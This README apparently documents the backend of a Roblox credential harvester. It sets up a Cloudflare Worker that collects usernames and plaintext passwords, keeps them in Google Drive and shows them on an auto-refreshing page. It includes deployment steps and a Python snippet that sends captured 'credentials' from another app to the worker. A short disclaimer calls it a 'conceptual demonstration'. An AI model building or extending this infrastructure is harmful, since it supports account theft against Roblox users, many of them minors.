# Roblox Credentials API - Cloudflare Worker

A serverless API for storing and retrieving Roblox credentials, deployed on Cloudflare Workers with Google Drive-backed storage.

## Features

- **REST API**: Clean REST endpoints for credential management
- **Serverless**: Runs on Cloudflare's edge network
- **Persistent Storage**: Uses Google Drive for data persistence
- **Web Interface**: Simple web page to view stored credentials
- **Auto-refresh**: Web page updates every 5 seconds

## API Endpoints

### GET `/`
Returns the web interface showing all stored credentials.

### GET `/api/credentials`
Returns all stored credentials as JSON array.

**Response:**
```json
[
  {
    "username": "example",
    "password": "secret123",
    "timestamp": "2024-01-01T12:00:00Z"
  }
]
```

### POST `/api/credentials`
Stores a new credential object.

**Request Body:**
```json
{
  "username": "newuser",
  "password": "newpass",
  "timestamp": "2024-01-01T12:00:00Z"
}
```

**Response:**
```json
{
  "message": "Data stored successfully",
  "route": "/api/credentials"
}
```

### GET `/api/health`
Health check endpoint.

**Response:**
```json
{
  "status": "ok",
  "entries": 5
}
```

## Deployment to Cloudflare

### Prerequisites

1. **Cloudflare Account**: Sign up at [cloudflare.com](https://cloudflare.com)
2. **Wrangler CLI**: Already installed globally
3. **Cloudflare API Token**: Generate one at [dash.cloudflare.com/profile/api-tokens](https://dash.cloudflare.com/profile/api-tokens)

### Step 1: Authenticate Wrangler

```bash
wrangler auth login
```

### Step 2: Configure Google Drive storage

This worker stores data in a Google Drive file. You must provide a service account JSON and a Drive file ID.

1. Enable the Google Drive API for your Google Cloud project.
2. Create a service account and download the JSON credentials.
3. Create or share a Drive file for the service account to use.

Set the secrets in Cloudflare:

```bash
npx wrangler secret put GOOGLE_SERVICE_ACCOUNT_JSON
npx wrangler secret put GOOGLE_DRIVE_FILE_ID
```

The Drive file ID should point to a file created or shared with the service account.

### Step 3: Deploy

```bash
npm run deploy
```

This will deploy your Worker and provide a URL like:
`https://roblox-credentials-api.your-subdomain.workers.dev`

## Development

### Local Development

```bash
npm run dev
```

This starts a local development server at `http://localhost:8787`

### Testing the API

```bash
# Health check
curl http://localhost:8787/api/health

# Get credentials
curl http://localhost:8787/api/credentials

# Store a credential
curl -X POST http://localhost:8787/api/credentials \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}'
```

## Integration with Your App

Update your Python application to send data to the Cloudflare Worker URL:

```python
import requests

# Replace with your deployed Worker URL
API_URL = "https://your-worker-url.workers.dev/api/credentials"

# Send credentials
response = requests.post(API_URL, json={
    'credentials': potential_fields,
    'timestamp': datetime.datetime.now().isoformat()
})

if response.status_code == 200:
    print("Credentials sent to Cloudflare successfully!")
```

## Security Considerations

⚠️ **Important**: This is a conceptual demonstration. In production:

1. **Add Authentication**: Implement API keys or JWT tokens
2. **Input Validation**: Validate and sanitize all inputs
3. **Rate Limiting**: Add rate limiting to prevent abuse
4. **Encryption**: Encrypt sensitive data before storage
5. **Access Control**: Restrict who can read/write data

## File Structure

```
/
├── src/
│   └── index.ts          # Main Worker code
├── wrangler.toml         # Cloudflare configuration
├── package.json          # Node.js dependencies
└── README.md            # This file
```

## Support

For Cloudflare Workers documentation: [developers.cloudflare.com/workers](https://developers.cloudflare.com/workers)